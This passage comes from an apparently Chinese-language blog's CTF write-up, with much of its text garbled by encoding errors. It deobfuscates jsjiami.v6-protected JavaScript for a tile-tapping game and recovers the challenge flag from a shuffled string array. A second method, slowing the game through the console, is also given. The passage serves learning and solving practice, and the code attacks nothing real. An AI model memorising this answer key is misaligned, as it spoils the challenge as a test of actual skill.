class="built_in">parseInt</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;64&#x27;</span>)]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]))+<span class="string">&#x27;\x20\x20\x20æµ£çŠµæ®‘flagæ¶“ï¿½&#x27;</span>+flag);&#125;<span class="keyword">else</span>&#123;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;65&#x27;</span>)](confirm,_0xf81cd5[<span class="string">&#x27;hbFUP&#x27;</span>](<span class="string">&#x27;æµ£çŠµæ®‘éˆâ‚¬ç¼å ç·±é’å“±x20&#x27;</span>,<span class="built_in">parseInt</span>(_0xf81cd5[<span class="string">&#x27;LWTJm&#x27;</span>]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]))+<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>));&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:<span class="built_in">clearInterval</span>(clock);<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">var</span> _0x1cb1ea=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;66&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="string">&#x27;-408px&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;5&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;6&#x27;</span>:result=![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;7&#x27;</span>:<span class="title function_">check_action</span>();<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x46c9a8=&#123;<span class="string">&#x27;umTQz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5f2b56,_0x242990</span>)&#123;<span class="keyword">return</span> _0x5f2b56+_0x242990;&#125;,<span class="string">&#x27;ARCNA&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xfad634,_0x337d72</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xfad634</span>(_0x337d72);&#125;,<span class="string">&#x27;EzhLo&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x29f7e7,_0x5ac2d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x29f7e7</span>(_0x5ac2d2);&#125;,<span class="string">&#x27;CPlbK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;nYpQm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xb5ea2e,_0x53a641</span>)&#123;<span class="keyword">return</span> _0xb5ea2e==_0x53a641;&#125;,<span class="string">&#x27;fnuqu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4b9f96</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4b9f96</span>();&#125;&#125;;<span class="keyword">var</span> _0x1a84ef=_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;67&#x27;</span>)](<span class="built_in">parseInt</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;68&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x1</span>);_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;69&#x27;</span>)]($,_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6a&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=_0x1a84ef;<span class="keyword">if</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6b&#x27;</span>)](_0x1a84ef%<span class="number">0xa</span>,<span class="number">0x0</span>))&#123;_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6c&#x27;</span>)](speedup);&#125;&#125;;_0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç åˆè‡­åˆé•¿ï¼Œä½†æ˜¯åœ¨ä»£ç çš„å‰é¢å·²ç»æé†’æˆ‘ä»¬è¿™é‡Œæ˜¯ç»è¿‡jsjiami.v6åŠ å¯†è¿‡çš„ï¼Œç½‘ä¸Šæœ‰ç›´æ¥çš„è§£å¯†å·¥å…·**<a href="https://github.com/zhangyanlin2022/JsjiamiV6-Decryptor-1">JsjiamiV6-Decryptor</a>**ï¼Œé¡¹ç›®çš„READMEä¸­æœ‰è§£é‡Šåˆ©ç”¨æ–¹æ³•ï¼Œç›´æ¥æ ¹æ®è¯¥æ–¹æ³•åˆ©ç”¨å³å¯ï¼š</p><p><a href="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png"></a></p><p>æ¥ä¸‹æ¥ç›´æ¥æŸ¥çœ‹è§£å¯†ä¹‹åçš„æ–‡ä»¶DecryptResult5.jsï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(_0x4c27d2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    _0x138beb.<span class="property">className</span>=_0x1e165d;</span><br><span class="line">    <span class="keyword">return</span> _0x138beb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> clock=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> speed=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">var</span> result=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!result)&#123;</span><br><span class="line">        <span class="title function_">init</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;æ¸¸æˆå·²ç»å¼€å§‹ï¼Œæ— éœ€å†æ¬¡ç‚¹å‡»ï¼&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    result=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0</span>;_0x340b33&lt;<span class="number">4</span>;_0x340b33++)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&#x27;main&#x27;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;</span><br><span class="line">        _0x5abac5=(_0x5abac5||event);</span><br><span class="line">        <span class="title function_">judge</span>(_0x5abac5);</span><br><span class="line">    &#125;;</span><br><span class="line">    clock=<span class="variable language_">window</span>.<span class="built_in">setInterval</span>(<span class="string">&#x27;move()&#x27;</span>,<span class="number">30</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;</span><br><span class="line">    flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(<span class="string">&#x27;row&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();</span><br><span class="line">    _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0</span>;_0xa4a713&lt;<span class="number">4</span>;_0xa4a713++)&#123;</span><br><span class="line">        _0x5afcef.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));</span><br><span class="line">    &#125;<span class="keyword">if</span>(_0x3b3385.<span class="property">firstChild</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">insertBefore</span>(_0x5afcef,_0x3b3385.<span class="property">firstChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(_0x13b8d4.<span class="property">childNodes</span>.<span class="property">length</span>==<span class="number">6</span>)&#123;</span><br><span class="line">        _0x13b8d4.<span class="title function_">removeChild</span>(_0x13b8d4.<span class="property">lastChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">4</span>);</span><br><span class="line">    _0x350dc0[_0x143001]=<span class="string">&#x27;cell black&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> _0x350dc0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x7d254e=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(_0x7d254e,<span class="literal">null</span>).<span class="property">top</span>);</span><br><span class="line">    <span class="keyword">if</span>(speed+_0xcb4af7&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        _0xcb4af7=<span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0xcb4af7+=speed;</span><br><span class="line">    &#125;</span><br><span class="line">    _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">    <span class="title function_">over</span>();</span><br><span class="line">    <span class="keyword">if</span>(_0xcb4af7==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">        _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-101px&#x27;</span>;</span><br><span class="line">        <span class="title function_">delrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    speed+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(speed==<span class="number">20</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;ä½ è¶…ç¥äº†ï¼&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5d88ab=con.<span class="property">childNodes</span>;</span><br><span class="line">    <span class="keyword">if</span>(_0x5d88ab.<span class="property">length</span>==<span class="number">5</span>&amp;&amp;(_0x5d88ab[_0x5d88ab.<span class="property">length</span>-<span class="number">1</span>].<span class="property">pass</span>!==<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="title function_">fail</span>();</span><br><span class="line">    &#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0</span>;_0x2f89b3&lt;_0x5d88ab.<span class="property">length</span>;_0x2f89b3++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(_0x5d88ab[_0x2f89b3].<span class="property">pass1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">fail</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">    result=<span class="literal">false</span>;</span><br><span class="line">    <span class="title function_">check_action</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)&gt;<span class="number">110</span>)&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;æµ£çŠµæ®‘éˆâ‚¬ç¼å ç·±é’å“±x20&#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   æµ£çŠµæ®‘flagæ¶“ï¿½&#x27;</span>+flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;ä½ çš„æœ€ç»ˆå¾—åˆ† &#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   å“ˆå“ˆï¼Œå°±è¿™æ°´å¹³è¿˜æƒ³æ‹¿flagï¼Ÿ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x35bf64=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    _0x35bf64.<span class="property">innerHTML</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=<span class="number">0</span>;</span><br><span class="line">    _0x35bf64.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-408px&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)==-<span class="number">1</span>&amp;&amp;(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;cell&#x27;</span>)!=-<span class="number">1</span>))&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span>=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">className</span>=<span class="string">&#x27;cell&#x27;</span>;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="title function_">score</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x1a84ef=(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="number">1</span>);</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=_0x1a84ef;</span><br><span class="line">    <span class="keyword">if</span>(_0x1a84ef%<span class="number">10</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">speedup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸‹ä»£ç å°±å˜å¾—å¾ˆç®€å•æ˜“è¯»äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡flagçš„å®šä¹‰æ‹¿åˆ°flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line">flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡åœ¨æ§åˆ¶å°ä¸­å‡å°javascriptä¸­çš„çš„speedå˜é‡ç„¶åç©æ¸¸æˆæ‹¿åˆ°110åˆ†ï¼Œå› ä¸ºé€šè¿‡å®¡è®¡ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°speedæ˜¯æ§åˆ¶æ¸¸æˆè¿è¡Œé€Ÿåº¦çš„å˜é‡ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
